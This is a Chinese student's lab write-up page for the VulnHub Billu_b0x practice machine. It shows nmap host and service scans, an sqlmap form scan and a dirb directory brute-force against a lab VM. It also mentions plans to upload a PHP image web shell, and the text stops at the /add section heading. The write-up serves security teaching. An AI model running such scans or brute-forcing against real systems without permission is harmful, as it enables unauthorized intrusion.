
<!DOCTYPE html>

<html class="no-js" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<link href="../lab04/" rel="prev"/>
<link href="../../ICS%26%26CSAPP-Lab/intro/" rel="next"/>
<link href="../../../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.6.1, mkdocs-material-9.6.20" name="generator"/>
<title>Lab05 - CSNote</title>
<link href="../../../assets/stylesheets/main.e53b48f4.min.css" rel="stylesheet"/>
<link href="../../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
<style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
<link href="../../../stylesheets/extra.css" rel="stylesheet"/>
<link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css" rel="stylesheet"/>
<link href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&amp;display=swap" rel="stylesheet"/>
<link href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css" rel="stylesheet"/>
<script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
</head>
<body data-md-color-accent="indigo" data-md-color-primary="black" data-md-color-scheme="default" dir="ltr">
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#lab05-writeup">
          Skip to content
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header md-header--shadow" data-md-component="header">
<nav aria-label="Header" class="md-header__inner md-grid">
<a aria-label="CSNote" class="md-header__button md-logo" data-md-component="logo" href="../../.." title="CSNote">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            CSNote
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              Lab05
            
          </span>
</div>
</div>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Navigation" class="md-nav md-nav--primary" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="CSNote" class="md-nav__button md-logo" data-md-component="logo" href="../../.." title="CSNote">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
</a>
    CSNote
  </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../..">
<span class="md-ellipsis">
    index
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
<span class="md-ellipsis">
    OI-learning
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_2">
<span class="md-nav__icon md-icon"></span>
            OI-learning
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/">
<span class="md-ellipsis">
    intro
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/C%2B%2B%20OOP/">
<span class="md-ellipsis">
    C++ é¢å‘å¯¹è±¡
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
<span class="md-ellipsis">
    Algorithm
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_3">
<span class="md-nav__icon md-icon"></span>
            Algorithm
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Algorithm/STL_algorithm/">
<span class="md-ellipsis">
    STL ç®—æ³•åº“ ref
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Algorithm/fastpow/">
<span class="md-ellipsis">
    å¿«é€Ÿå¹‚
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_2_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
<span class="md-ellipsis">
    Data Structure
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_4_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_2_4">
<span class="md-nav__icon md-icon"></span>
            Data Structure
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/linkedlist/">
<span class="md-ellipsis">
    é“¾è¡¨
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/vector/">
<span class="md-ellipsis">
    STL vector ref
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/stack/">
<span class="md-ellipsis">
    æ ˆ &amp;&amp; å•è°ƒæ ˆ
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/queue/">
<span class="md-ellipsis">
    é˜Ÿåˆ— &amp;&amp; å•è°ƒé˜Ÿåˆ—
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../../OI-Learning/Data-Structure/hashmap/">
<span class="md-ellipsis">
    å“ˆå¸Œè¡¨
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
<span class="md-ellipsis">
    Course Notes
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="true" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_3">
<span class="md-nav__icon md-icon"></span>
            Course Notes
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_1" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
<span class="md-ellipsis">
    ICSPA x86 note
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_1_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_1">
<span class="md-nav__icon md-icon"></span>
            ICSPA x86 note
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA0/">
<span class="md-ellipsis">
    PA0
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA1/">
<span class="md-ellipsis">
    PA1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA2-1/">
<span class="md-ellipsis">
    PA2-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/i386/">
<span class="md-ellipsis">
    i386 æŒ‡ä»¤ç»“æ„ for PA2-1
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICSPA-x86/PA2-2/">
<span class="md-ellipsis">
    PA2-2
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_3_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
<span class="md-ellipsis">
    ç½‘ç»œæ”»é˜²å®æˆ˜ note
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="true" aria-labelledby="__nav_3_2_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_2">
<span class="md-nav__icon md-icon"></span>
            ç½‘ç»œæ”»é˜²å®æˆ˜ note
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../lab01/">
<span class="md-ellipsis">
    Lab01
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab02/">
<span class="md-ellipsis">
    Lab02
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab03/">
<span class="md-ellipsis">
    Lab03
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../lab04/">
<span class="md-ellipsis">
    Lab04
    
  </span>
</a>
</li>
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
<label class="md-nav__link md-nav__link--active" for="__toc">
<span class="md-ellipsis">
    Lab05
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<a class="md-nav__link md-nav__link--active" href="./">
<span class="md-ellipsis">
    Lab05
    
  </span>
</a>
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#_1">
<span class="md-ellipsis">
      æ¸—é€ç›®çš„
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
<span class="md-ellipsis">
      å…·ä½“æ“ä½œ
    </span>
</a>
<nav aria-label="å…·ä½“æ“ä½œ" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
<span class="md-ellipsis">
      ä¿¡æ¯æ”¶é›†
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#1-http">
<span class="md-ellipsis">
      å°è¯•æ–¹å‘ 1: HTTP
    </span>
</a>
<nav aria-label="å°è¯•æ–¹å‘ 1: HTTP" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#http">
<span class="md-ellipsis">
      HTTP ç›®å½•çˆ†ç ´
    </span>
</a>
<nav aria-label="HTTP ç›®å½•çˆ†ç ´" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#add">
<span class="md-ellipsis">
      /add å­é¡µé¢
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#test">
<span class="md-ellipsis">
      /test å­é¡µé¢
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#indexphp">
<span class="md-ellipsis">
      /index.php æ ¹é¡µé¢
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#2-ssh">
<span class="md-ellipsis">
      å°è¯•æ–¹å‘ 2: SSH
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
<span class="md-ellipsis">
      æ¸—é€ç»“æœ
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
<span class="md-ellipsis">
      æ¸—é€å…¨è¿‡ç¨‹å›¾ç¤º
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
<span class="md-ellipsis">
      å…¶ä»–
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_3_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
<span class="md-ellipsis">
    ICS &amp;&amp; CSAPP Labs
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_3_label" class="md-nav" data-md-level="2">
<label class="md-nav__title" for="__nav_3_3">
<span class="md-nav__icon md-icon"></span>
            ICS &amp;&amp; CSAPP Labs
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/intro/">
<span class="md-ellipsis">
    intro
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/Datalab/">
<span class="md-ellipsis">
    CSAPP Datalab
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/Bomblab/">
<span class="md-ellipsis">
    CSAPP Bomblab
    
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../ICS%26%26CSAPP-Lab/Binalab/">
<span class="md-ellipsis">
    ICS Binalab
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
<span class="md-ellipsis">
    Deep Learning
    
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_4">
<span class="md-nav__icon md-icon"></span>
            Deep Learning
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../../Deep-Learning/intro/">
<span class="md-ellipsis">
    intro
    
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#_1">
<span class="md-ellipsis">
      æ¸—é€ç›®çš„
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_2">
<span class="md-ellipsis">
      å…·ä½“æ“ä½œ
    </span>
</a>
<nav aria-label="å…·ä½“æ“ä½œ" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#_3">
<span class="md-ellipsis">
      ä¿¡æ¯æ”¶é›†
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#1-http">
<span class="md-ellipsis">
      å°è¯•æ–¹å‘ 1: HTTP
    </span>
</a>
<nav aria-label="å°è¯•æ–¹å‘ 1: HTTP" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#http">
<span class="md-ellipsis">
      HTTP ç›®å½•çˆ†ç ´
    </span>
</a>
<nav aria-label="HTTP ç›®å½•çˆ†ç ´" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#add">
<span class="md-ellipsis">
      /add å­é¡µé¢
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#test">
<span class="md-ellipsis">
      /test å­é¡µé¢
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#indexphp">
<span class="md-ellipsis">
      /index.php æ ¹é¡µé¢
    </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#2-ssh">
<span class="md-ellipsis">
      å°è¯•æ–¹å‘ 2: SSH
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_4">
<span class="md-ellipsis">
      æ¸—é€ç»“æœ
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_5">
<span class="md-ellipsis">
      æ¸—é€å…¨è¿‡ç¨‹å›¾ç¤º
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#_6">
<span class="md-ellipsis">
      å…¶ä»–
    </span>
</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<h1 id="lab05-writeup">ç½‘ç»œæ”»é˜²å®æˆ˜ Lab05 Writeup</h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p>âœ 1975 words  | ğŸ› 257 codelines  | â° 10 min read | Enjoy ğŸ¶</p>
</div>
<div class="admonition quote">
<p class="admonition-title">ä½¿ç”¨çš„é¶æœºä¸º VulnHub IndiShell Lab: Billu_b0x</p>
</div>
<div class="admonition success">
<p class="admonition-title">ç›®å‰ä¸ºæ­¢æœ€å¤æ‚ &amp;&amp; è§£æ³•æœ€å¤šçš„é¶æœº</p>
</div>
<h2 id="_1">æ¸—é€ç›®çš„</h2>
<p>å–å¾—ç›®æ ‡é¶æœºçš„ root æƒé™</p>
<p>äº†è§£ SQL æ³¨å…¥ï¼Œdirb åœ°å€çˆ†ç ´ï¼Œè¿œç¨‹æ–‡ä»¶ä¸‹è½½ï¼Œå›¾ç‰‡é©¬æ”»å‡»ç­‰æ¸—é€æ–¹æ³•</p>
<h2 id="_2">å…·ä½“æ“ä½œ</h2>
<h3 id="_3">ä¿¡æ¯æ”¶é›†</h3>
<p>å¯åŠ¨ VirtualBox ä¸­çš„ Kali æ”»å‡»æœºï¼ˆç”¨äºè¿›è¡Œæ¸—é€æ”»å‡»ï¼‰ä¸ Kioptix é¶æœºï¼Œç½‘ç»œé‡‡ç”¨ NAT è¿æ¥</p>
<p><code>ifconfig</code> è·å–æ”»å‡»æœºçš„ ip ä¸º <code>10.0.2.3</code>ï¼Œä½¿ç”¨ <code>nmap</code> æ‰«æ ipï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sn 10.0.2.0/24
Starting Nmap 7.95 ( nmap.org ) at 2025-10-21 08:42 CST
Nmap scan report for bogon (10.0.2.1)
Host is up (0.00033s latency).
MAC Address: 52:55:0A:00:02:01 (Unknown)
Nmap scan report for bogon (10.0.2.2)
Host is up (0.00026s latency).
MAC Address: 08:00:27:F2:95:CC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.5)
Host is up (0.0013s latency).
MAC Address: 08:00:27:1C:31:B1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for bogon (10.0.2.3)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.94 seconds
</code></pre></div></td></tr></table></div>
<p>è€ƒè™‘é¶æœº ip ä¸º <code>10.0.2.5</code>ï¼Œç»§ç»­æ‰«æç«¯å£ <code>nmap -sV -sC 10.0.2.5</code>ï¼Œçœ‹çœ‹æœ‰å“ªäº›æœåŠ¡é¡¹</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sV -sC 10.0.2.5
Starting Nmap 7.95 ( nmap.org ) at 2025-10-21 08:42 CST
Nmap scan report for bogon (10.0.2.5)
Host is up (0.0028s latency).
Not shown: 998 closed tcp ports (reset)

// SSH æœåŠ¡
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 fa:cf:a2:52:c4:fa:f5:75:a7:e2:bd:60:83:3e:7b:de (DSA)
|   2048 88:31:0c:78:98:80:ef:33:fa:26:22:ed:d0:9b:ba:f8 (RSA)
|_  256 0e:5e:33:03:50:c9:1e:b3:e7:51:39:a4:4a:10:64:ca (ECDSA)

// HTTP æœåŠ¡
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: --==[[IndiShell Lab]]==--
|_http-server-header: Apache/2.2.22 (Ubuntu)
MAC Address: 08:00:27:1C:31:B1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
</code></pre></div></td></tr></table></div>
<p>åŒæ—¶ç¡®å®šé¶æœºæ“ä½œç³»ç»Ÿä¸º <code>Ubuntu</code></p>
<hr/>
<h3 id="1-http">å°è¯•æ–¹å‘ 1: HTTP</h3>
<p><img alt="image-20251021084739779" src="../images/image-20251021084739779.png"/></p>
<p>å‘ç°éœ€è¦è´¦å·å’Œå¯†ç ï¼Œsqlmap æ‰«ä¸åˆ°æ³¨å…¥ç‚¹ï¼Œä½†æ˜¯æ­¤å¤„ â€œShow me your SQLI skillsâ€ è¯´æ˜åº”è¯¥æœ‰æ³¨å…¥ç‚¹ï¼›éšæ„è¾“å…¥è´¦å·å¯†ç ç™»å½•ï¼ŒæŠ“åŒ…å†…å®¹ä¹Ÿæ²¡ä»€ä¹ˆçº¿ç´¢</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; sqlmap -u 10.0.2.5 --forms --crawl=2 --risk=2 --level=3
// æœ€ç»ˆ sqlmap çš„ç»“æœ
[09:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
</code></pre></div></td></tr></table></div>
<h4 id="http">HTTP ç›®å½•çˆ†ç ´</h4>
<p>å†³å®šç”¨ <code>dirb</code> æ‰«ä¸€ä¸‹ï¼Œæ‰«å‡ºæ¥ä¸œè¥¿ä¸å°‘ï¼Œä»¥ä¸‹æ˜¯ç²¾ç®€åçš„å†…å®¹ï¼š</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span></pre></div></td><td class="code"><div><pre><span></span><code>dirb http://10.0.2.5 /usr/share/dirb/wordlists/big.txt
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Oct 21 09:24:16 2025
URL_BASE: http://10.0.2.5/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.0.2.5/ ----
+ http://10.0.2.5/add (CODE:200|SIZE:307)
+ http://10.0.2.5/c (CODE:200|SIZE:1)
+ http://10.0.2.5/cgi-bin/ (CODE:403|SIZE:284)
+ http://10.0.2.5/head (CODE:200|SIZE:2793)
==&gt; DIRECTORY: http://10.0.2.5/images/
+ http://10.0.2.5/in (CODE:200|SIZE:47524)
+ http://10.0.2.5/index (CODE:200|SIZE:3267)
+ http://10.0.2.5/panel (CODE:302|SIZE:2469)
==&gt; DIRECTORY: http://10.0.2.5/phpmy/
+ http://10.0.2.5/server-status (CODE:403|SIZE:289)
+ http://10.0.2.5/show (CODE:200|SIZE:1)
+ http://10.0.2.5/test (CODE:200|SIZE:72)
==&gt; DIRECTORY: http://10.0.2.5/uploaded_images/
// çœç•¥æ¯ä¸ª Directory é‡Œçš„å†…å®¹
-----------------
END_TIME: Tue Oct 21 09:26:36 2025
DOWNLOADED: 61374 - FOUND: 37
</code></pre></div></td></tr></table></div>
<p>ä»¥ä¸‹æ˜¯å‡ ä¸ªé‡ç‚¹å…³æ³¨çš„ subsiteï¼ˆè‡³å°‘å¯ä»¥æ­£å¸¸æ‰“å¼€ï¼‰ï¼š</p>
<blockquote>
<p>10.0.2.5/add</p>
<p>ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡çš„å…¥å£ï¼Œæ€€ç–‘å¯ä»¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼ˆæ¯”å¦‚ php ä¸€å¥è¯æœ¨é©¬ï¼‰</p>
</blockquote>
<p><img alt="image-20251021104214819" src="../images/image-20251021104214819.png"/></p>
<blockquote>
<p>10.0.2.5/test</p>
<p>ç¼ºå°‘ä¸€ä¸ª file å­—æ®µï¼Œæ€€ç–‘å¯ä»¥åœ¨ /add ç½‘ç«™ä¸Šä¼ å›¾ç‰‡é©¬ååœ¨è¿™é‡Œè®¿é—®ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</p>
</blockquote>
<p><img alt="image-20251021104628374" src="../images/image-20251021104628374.png"/></p>
<blockquote>
<p>10.0.2.5/in</p>
<p>PHP ç¯å¢ƒä¸é…ç½®ä¸€è§ˆæ— é—ï¼Œæœ€æ ¸å¿ƒçš„æ˜¯ System å­—æ®µï¼Œå±•ç¤ºäº†é¶æœºç³»ç»Ÿå’Œå†…æ ¸ç‰ˆæœ¬</p>
</blockquote>
<p><img alt="image-20251021104434863" src="../images/image-20251021104434863.png"/></p>
<blockquote>
<p>10.0.2.5/phpmy</p>
<p>php ç™»å½•é¡µé¢ï¼Œé»˜è®¤å¯†ç ä¸æ­£ç¡®</p>
</blockquote>
<p><img alt="image-20251021104524680" src="../images/image-20251021104524680.png"/></p>
<blockquote>
<p>10.0.2.5/index</p>
<p>é»˜è®¤çš„ç™»å½•ç½‘ç«™ï¼Œæˆ‘çœŸçš„ä¸ç›¸ä¿¡æ²¡æœ‰ SQL æ³¨å…¥ç‚¹</p>
</blockquote>
<h5 id="add">/add å­é¡µé¢</h5>
